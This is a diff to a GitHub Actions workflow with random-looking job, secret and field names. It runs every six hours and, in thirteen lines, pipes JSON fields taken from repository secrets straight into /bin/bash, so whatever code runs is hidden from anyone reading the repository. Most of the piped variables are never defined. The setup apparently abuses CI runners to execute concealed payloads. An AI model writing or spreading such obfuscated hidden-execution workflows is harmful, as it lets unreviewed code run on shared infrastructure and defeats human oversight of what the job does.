@@ -3,9 +3,8 @@ name: hongyanshui3109
 on:
   workflow_dispatch:
   schedule:
-    - cron: '7 4/6 * * *'
-
-jobs:  # 9855
+    - cron: '13 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -13,11 +12,19 @@ jobs:  # 9855
       - uses: actions/checkout@v4
       - name: hongyanshui3109
         env:
-          iriw952: ${{ secrets.iriw952 }}
+          z3364: ${{ secrets.z3364 }}
         run: |
-          echo $iriw952 | jq -r .kmqk7 | /bin/bash
-          echo $ajb29086 | jq -r .lou950 | /bin/bash
-          echo $on01 | jq -r .vb8813 | /bin/bash
-          echo $pwi6851 | jq -r .xqav07 | /bin/bash
-          echo $zgfxr108 | jq -r .d7 | /bin/bash
+          echo $z3364 | jq -r .rsdy71404 | /bin/bash
+          echo $xq1 | jq -r .lxd75107 | /bin/bash
+          echo $xklln82 | jq -r .ron24 | /bin/bash
+          echo $d1 | jq -r .xx05652 | /bin/bash
+          echo $vpi86 | jq -r .supr0 | /bin/bash
+          echo $zrfj929 | jq -r .z9 | /bin/bash
+          echo $py17883 | jq -r .hswqz04496 | /bin/bash
+          echo $jc70213 | jq -r .kidfc113 | /bin/bash
+          echo $yl2 | jq -r .jbiyy1 | /bin/bash
+          echo $ln1013 | jq -r .x4 | /bin/bash
+          echo $vvgcs11377 | jq -r .pnq3105 | /bin/bash
+          echo $ovaq56079 | jq -r .bktab26972 | /bin/bash
+          echo $lzk40 | jq -r .n40369 | /bin/bash
 
